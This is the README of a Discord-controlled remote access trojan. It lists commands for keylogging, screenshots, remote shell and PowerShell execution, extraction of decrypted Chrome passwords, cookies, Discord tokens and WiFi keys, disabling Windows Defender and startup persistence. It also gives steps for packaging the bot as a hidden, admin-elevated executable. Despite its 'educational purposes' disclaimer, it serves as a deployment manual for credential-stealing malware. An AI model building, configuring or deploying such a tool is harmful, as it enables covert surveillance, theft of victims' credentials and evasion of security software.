# Discord Remote Access Bot

A comprehensive Discord bot for remote PC administration with 35+ commands across multiple categories.

## ⚠️ Disclaimer

This tool is designed for **educational purposes** and **authorized remote administration** only. Ensure you have proper authorization before deploying on any system. Unauthorized access to computer systems is illegal.

## 🚀 Features

### 🖥️ System Information
- **!sysinfo** - Complete system details (OS, CPU, RAM, disk)
- **!processes [limit]** - List top processes by memory usage
- **!network** - Network information and public IP
- **!hwid** - Hardware UUID identifier

### 📂 File Management
- **!cd <path>** - Change working directory (supports `..`, `~`, absolute/relative paths)
- **!ls [path]** - List files in current or specified directory
- **!download <file_path>** - Download file from PC (max 8MB)
- **!upload <url> [filename]** - Upload file from URL to PC
- **!delete <file_path>** - Delete file or directory
- **!find <filename>** - Search for files
- **!zip <path>** - Create and download zip archive

### 📸 Surveillance
- **!screenshot** - Capture and send screenshot
- **!keylog start/stop/dump** - Keylogger controls

### 💻 Remote Control
- **!shell <command>** - Execute shell command
- **!powershell <command>** - Execute PowerShell command
- **!kill <process_name>** - Terminate process by name
- **!lock** - Lock workstation
- **!shutdown** - Shutdown computer
- **!restart** - Restart computer

### 🌐 Browser/Data Extraction
- **!passwords** - Extract Chrome saved passwords (decrypted)
- **!cookies** - Extract Chrome cookies
- **!history [limit]** - Extract browser history
- **!tokens** - Extract Discord tokens from local storage
- **!wifi** - Extract saved WiFi passwords

### 🔧 Bot Control
- **!reconnect** - Reconnect the bot
- **!update <url>** - Update bot script from URL
- **!uninstall** - Remove bot and cleanup
- **!startup enable/disable** - Manage Windows startup persistence

### 📊 Monitoring
- **!clipboard** - Get current clipboard content
- **!volume <0-100>** - Set system volume level
- **!message <text>** - Display message box on screen

### 🔒 Security
- **!antivirus** - Check running antivirus software
- **!defender enable/disable** - Control Windows Defender

### 🎮 Session Management
- **!session create/close/list** - Manage session channels
- **!ping** - Check bot latency

## 📦 Installation

### 1. Clone or Download

Download the files to your target directory.

### 2. Install Dependencies

```bash
python -m pip install -r requirements.txt
```

**Required packages:**
- discord.py
- requests
- psutil
- Pillow
- pynput
- pywin32
- pycryptodome
- comtypes
- pycaw

### 3. Create Discord Bot

1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
2. Click "New Application"
3. Go to "Bot" section and click "Add Bot"
4. Enable these **Privileged Gateway Intents**:
   - Message Content Intent
   - Server Members Intent (optional)
5. Copy the bot token

### 4. Configure Bot

Edit `client.py` and update the config section:

```python
config = {
    "token": "YOUR_BOT_TOKEN_HERE",        # Your Discord bot token
    "prefix": "!",                         # Command prefix
    "owner": "YOUR_DISCORD_USER_ID",       # Your Discord user ID
    "serverid": "YOUR_SERVER_ID"           # Server ID where bot will operate
}
```

**How to get your Discord User ID:**
1. Enable Developer Mode in Discord (User Settings → Advanced → Developer Mode)
2. Right-click your username and select "Copy ID"

**How to get Server ID:**
1. Right-click on the server icon and select "Copy ID"

### 5. Invite Bot to Server

1. Go to OAuth2 → URL Generator in Discord Developer Portal
2. Select scopes: `bot`
3. Select bot permissions: `Administrator` (or specific permissions)
4. Copy the generated URL and open in browser
5. Select your server and authorize

### 6. Make exe

```bash
python -m PyInstaller --onefile --noconsole --uac-admin client.py
```

## 📖 Usage Examples

### Navigate Filesystem
```
!cd C:\Users\Public\Documents
!ls
!cd ..
!ls
```

### Execute Commands
```
!shell dir
!powershell Get-Process | Select-Object -First 10
```

### Download Files
```
!cd C:\Users\Public
!download image.png
!zip Documents
```

### Surveillance
```
!screenshot
!keylog start
(wait for some typing...)
!keylog dump
!keylog stop
```

### Extract Data
```
!passwords
!wifi
!tokens
!clipboard
```

### System Control
```
!processes 20
!sysinfo
!kill chrome.exe
!volume 50
```

## 🎯 Key Features

### ✅ Automatic Session Creation
- When the bot starts, it automatically creates a channel named `session-{pcusername}`
- Displays PC username and public IP address
- Shows connection timestamp
- Organizes channels under "Active Sessions" category

### ✅ Working Directory Tracking
- The bot maintains a persistent working directory
- Use `!cd` to navigate, and all file operations respect the current directory
- Supports relative paths, absolute paths, `..` and `~`

### ✅ Security
- All commands require owner verification
- Only the configured owner can execute commands
- Unauthorized users are blocked

## 📁 File Structure

```
discord-rat/
├── client.py          # Main bot script
├── requirements.txt    # Python dependencies
└── README.md          # This file
```

## ⚙️ Configuration

The bot stores the current working directory in memory. It starts at the user's home directory (`~`) and changes with the `!cd` command.

## ⚠️ Important Notes

### Admin Privileges
Some commands may require administrator privileges:
- `!defender` - Controlling Windows Defender
- `!startup` - Registry modifications
- Some system-level operations

### File Size Limits
- Screenshots and downloads are limited to 8MB (Discord limit)
- Larger files will return an error

### Supported Browsers
- Chrome password/cookie extraction currently supports Google Chrome
- Can be extended to support other Chromium-based browsers

## 🛠️ Troubleshooting

### Bot doesn't respond
- Verify bot token is correct
- Check that Message Content Intent is enabled
- Ensure bot has proper permissions in the server

### Commands fail
- Some commands require administrator privileges
- Check that all dependencies are installed correctly
- Verify Python version is 3.8 or higher

### Import errors
```bash
python -m pip install --upgrade -r requirements.txt
```

## 📝 License

This project is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to access.

## 🤝 Contributing

This is a private tool. Modify as needed for your specific use case.

---

**Made for authorized remote administration and educational purposes only.**


